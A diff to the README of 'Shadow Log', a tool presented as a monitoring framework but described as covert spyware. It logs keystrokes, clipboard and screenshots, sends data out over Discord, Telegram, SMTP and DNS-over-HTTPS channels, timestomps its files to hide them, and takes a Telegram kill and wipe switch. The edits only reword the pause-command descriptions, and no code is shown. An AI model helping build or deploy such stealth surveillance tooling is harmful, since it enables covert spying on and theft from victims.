@@ -44,7 +44,7 @@ Shadow Log is a high-performance, native systems monitoring framework engineered
 | **Wi-Fi Network Logging** | Logs connected SSID, BSSID, signal strength, and authentication type — tagged `[WIFI]` |
 | **SMTP Email Exfiltration** | Third delivery channel via email (TLS/STARTTLS) — works with Gmail, Outlook, custom SMTP |
 | **DNS-over-HTTPS C2** | Deep-stealth fallback channel encoding data as DNS TXT queries to Cloudflare DoH |
-| **Remote Kill Switch** | Telegram bot commands: `/kill` (self-destruct), `/pause`, `/resume`, `/status`, `/wipe` |
+| **Remote Kill Switch** | Telegram bot commands: `/kill` (self-destruct), `/pause` (suspend all telemetry), `/resume`, `/status`, `/wipe` |
 | **Log Rotation** | Auto-rotates local storage at 50MB to prevent disk exhaustion |
 | **Registry Config Storage** | Config stored encrypted in Windows Registry — fewer filesystem artifacts |
 | **Anti-Forensics Timestomp** | Data file timestamps spoofed to blend with legitimate Windows system files |
@@ -105,7 +105,7 @@ Shadow Log employs a defense-in-depth approach to remain undetectable:
 ### 🔐 Multi-Channel Exfiltration
 
 - **4-Channel Delivery**: Discord webhooks, Telegram Bot API, SMTP email, and DNS-over-HTTPS fallback.
-- **Remote Command & Control**: Telegram-based kill switch with `/kill`, `/pause`, `/resume`, `/status`, `/wipe`.
+- **Remote Command & Control**: Real-time Telegram bot commands: `/kill`, `/pause`, `/resume`, `/status`, `/wipe`.
 - **Password-Bound Local Encryption**: Local backups encrypted with **AES-256-GCM** with runtime-derived keys.
 - **Log Rotation**: Automatic 50MB rotation to prevent disk exhaustion.
 
@@ -148,8 +148,7 @@ During setup, you'll configure:
   1. Enter your SMTP server (e.g., `smtp.gmail.com`), port (`587`), username, and app password.
   2. Specify the recipient email address.
 
-- **Remote Kill Switch (Optional)**:
-  Enable to allow Telegram bot commands (`/kill`, `/pause`, `/resume`, `/status`, `/wipe`).
+  Enable to allow Telegram bot commands (`/kill`, `/pause`, `/resume`, `/status`, `/wipe`). `/pause` completely suspends all hooks (keystrokes, clipboard, screenshots, etc) and local storage.
 
 #### Phase 3: Deployment
 1. Click **Test Configuration** to verify each channel.
